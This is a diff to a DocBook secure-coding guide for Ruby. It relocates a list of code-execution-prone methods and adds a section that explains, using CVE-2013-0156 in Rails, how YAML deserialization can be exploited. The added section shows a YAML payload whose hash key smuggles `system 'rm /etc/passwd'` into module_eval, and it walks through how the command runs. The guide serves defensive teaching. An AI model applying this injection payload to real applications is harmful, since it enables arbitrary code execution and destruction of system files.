@@ -137,6 +137,42 @@ exploitable
   </section>
 
   <section>
+    <title>Dangerous methods</title>
+    <para>
+      Ruby contains number of methods and modules that should be used with caution, since calling them with input potentially controlled by attacker might be abused into arbitrary code execution. These include:
+      <itemizedlist>
+        <listitem>
+          <para><command>Kernel#exec</command>, <command>Kernel#system</command>, backticks and <command>%x{...}</command></para>
+        </listitem>
+        <listitem>
+          <para><command>Kernel#fork</command>, <command>Kernel#spawn</command></para>
+        </listitem>
+        <listitem>
+          <para><command>Kernel#load</command>, <command>Kernel#autoload</command></para>
+        </listitem>
+        <listitem>
+          <para><command>Kernel#require</command>, <command> Kernel#require_relative</command></para>
+        </listitem>
+        <listitem>
+          <para><command>DL</command> and <command>Fiddle</command> module</para>
+        </listitem>
+        <listitem>
+          <para><command>Object#send</command>, <command>Object#__send__</command> and <command>Object#public_send</command></para>
+        </listitem>
+        <listitem>
+          <para><command>BasicObject#instance_eval</command>, <command>BasicObject#instance_exec</command></para>
+        </listitem>
+        <listitem>
+          <para><command>Module#class_eval</command>, <command>Module#class_exec</command>, <command>Module#module_eval</command>, <command>Module#module_exec</command></para>
+        </listitem>
+        <listitem>
+          <para><command>Module#alias_method</command></para>
+        </listitem>
+      </itemizedlist>
+    </para>
+  </section>
+
+  <section>
     <title>Serialization in Ruby</title>
     <para>
       Deserialization of untrusted data has been on the top of critical vulnerabilities in 2013 (prominent examples are deserialization issues found in Ruby on Rails, see <ulink url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0156">CVE-2013-0156</ulink>, <ulink url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0277">CVE-2013-0277</ulink> or <ulink url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0333">CVE-2013-0333</ulink>). There are several ways  how to serialize objects in Ruby:
@@ -146,6 +182,7 @@ exploitable
         <para>
           <command>Marshal.dump</command> and <command>Marshal.load</command> can serialize and deserialize most of the classes in Ruby. If application deserializes data from untrusted source, attacker can abuse this to execute arbitrary code. Therefore, this method is not suitable most of the time and should never be be used on data from unstrusted source.
         </para>
+
       </section>
 
       <section>
@@ -170,6 +207,94 @@ exploitable
         <title>JSON.load</title>
         <para>
           JSON format supports only several primitive data types such as strings, arrays, hashes, numbers etc. This certainly limits the attack surface, but it should not give developer false sense of security - one example is <ulink url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0333">CVE-2013-0333</ulink> vulnerability in Ruby on Rails, when parser used for deserialization of JSON data actually converted data to a subset of <constant>YAML</constant> and used <command>YAML.load</command> to deserialize.
+        </para>
+      </section>
+      <section>
+        <title>Exploiting deserialization vulnerabilities</title>
+        <para>
+          To exploit deserialization vulnerability, there must already be a dangerous class loaded in the current namespace. In particular, it contains unsafe <command>init_with()</command> or <command>[]=</command> methods, that get called during deserialization. This might seem like an unlikely event, however, its very likely in case of big projects like Ruby on Rails. 
+        </para>
+        <para>
+          <ulink url="https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/61bkgvnSGTQ">CVE-2013-0156</ulink> vulnerability in Ruby on Rails can be used as an example. A vulnerable class in this case was <constant>ActionDispatch::Routing::RouteSet::NamedRouteCollection</constant>, which contained code like this:
+          <programlisting language="Ruby">
+class NamedRouteCollection
+  alias []=   add
+
+  def add(name, route)
+    routes[name.to_sym] = route
+    define_named_route_methods(name, route)
+  end
+
+  def define_named_route_methods(name, route)
+    define_url_helper route, :"#{name}_path",
+      route.defaults.merge(:use_route => name, :only_path => true)
+    define_url_helper route, :"#{name}_url",
+      route.defaults.merge(:use_route => name, :only_path => false)
+  end
+
+  def define_url_helper(route, name, options)@module.module_eval &lt;&lt;-END_EVAL
+      def #{name}(*args)
+        # ... code
+      end
+    END_EVAL
+  end
+
+  ...
+          </programlisting>
+          Even though <command>module_eval</command> is hidden under several layers of method calls, calling <command>[]=</command> effectively passes first argument to the <command>define_url_helper</command>, where it gets evaluated. 
+        </para>
+
+        <para>
+          To exploit vulnerable class, it is enough to deserialize YAML payload below:
+          <programlisting>
+--- !ruby/hash:NamedRouteCollection
+foo; end; system 'rm /etc/passwd'; def bar: baz
+          </programlisting>
+          Before deserialization, Ruby's YAML parser Psych first looks at the declared type, which says this object is an instance of <constant>NamedRouteCollection</constant> and subclass of Ruby's <constant>Kernel::Hash</constant> class.
+        </para>
+        <para>
+          Deserialization of hashes from YAML to Ruby makes use of <command>[]=</command> method. Given YAML like
+
+          <programlisting>
+--- !ruby/hash:MyHash
+key1: value1
+key2: value2
+          </programlisting>
+          deserialization process is equivalent to calling
+          <programlisting language="Ruby">
+newobj = MyHash.new
+newobj['key1'] = 'value1'
+newobj['key2'] = 'value2'
+newobj
+          </programlisting>
+        </para>
+
+        <para>
+          In the case of YAML payload, key and value pair is
+          <programlisting language="Ruby">
+['foo; end; system 'rm /etc/passwd'; def bar','baz']
+          </programlisting>
+          so deserialization process will call <command>[]=</command> method on <constant>NamedRouteCollection</constant> with key <code>'foo; end; system 'rm /etc/passwd'; def bar'</code>.
+        </para>
+        <para>
+          This gets passed to <command>define_url_helper</command> as an argument and following code gets evaluated:
+
+          <programlisting language="Ruby">
+def foo; end; system 'rm /etc/passwd'; def bar(*args)
+  # ... code
+end
+          </programlisting>
+          Reordering the code above to be more readable, this is equivalent to
+          <programlisting language="Ruby">
+def foo
+end 
+
+system 'rm /etc/passwd'
+
+def bar(*args)
+  # ... code
+end
+          </programlisting>
         </para>
       </section>
   </section>
@@ -207,41 +332,7 @@ Bang!
     </para>
   </section>
 
-  <section>
-    <title>Dangerous methods</title>
-    <para>
-      Ruby contains number of methods and modules that should be used with caution, since calling them with input potentially controlled by attacker might be abused into arbitrary code execution. These include:
-      <itemizedlist>
-        <listitem>
-          <para><command>Kernel#exec</command>, <command>Kernel#system</command>, backticks and <command>%x{...}</command></para>
-        </listitem>
-        <listitem>
-          <para><command>Kernel#fork</command>, <command>Kernel#spawn</command></para>
-        </listitem>
-        <listitem>
-          <para><command>Kernel#load</command>, <command>Kernel#autoload</command></para>
-        </listitem>
-        <listitem>
-          <para><command>Kernel#require</command>, <command> Kernel#require_relative</command></para>
-        </listitem>
-        <listitem>
-          <para><command>DL</command> and <command>Fiddle</command> module</para>
-        </listitem>
-        <listitem>
-          <para><command>Object#send</command>, <command>Object#__send__</command> and <command>Object#public_send</command></para>
-        </listitem>
-        <listitem>
-          <para><command>BasicObject#instance_eval</command>, <command>BasicObject#instance_exec</command></para>
-        </listitem>
-        <listitem>
-          <para><command>Module#class_eval</command>, <command>Module#class_exec</command>, <command>Module#module_eval</command>, <command>Module#module_exec</command></para>
-        </listitem>
-        <listitem>
-          <para><command>Module#alias_method</command></para>
-        </listitem>
-      </itemizedlist>
-    </para>
-  </section>
+  
 
   <section>
     <title>Object.send</title>
